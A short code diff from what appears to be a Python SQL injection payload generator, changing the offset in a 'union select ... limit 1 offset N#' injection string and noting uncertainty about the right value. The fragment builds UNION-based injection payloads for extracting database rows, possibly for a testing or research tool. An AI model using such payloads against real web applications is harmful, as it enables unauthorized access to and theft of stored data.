@@ -25,7 +25,7 @@ def generate_actions(escapes = None, max_columns = 5):
 			actions.append(x)
 
 			#XXX As far as I can tell we put the offset on hold and set it to 2 XXX correct me if this is worng
-			x = "{0} union select {1} limit 1 offset 2#".format(esc, columns)
+			x = "{0} union select {1} limit 1 offset 1#".format(esc, columns)
 			actions.append(x)
 
 
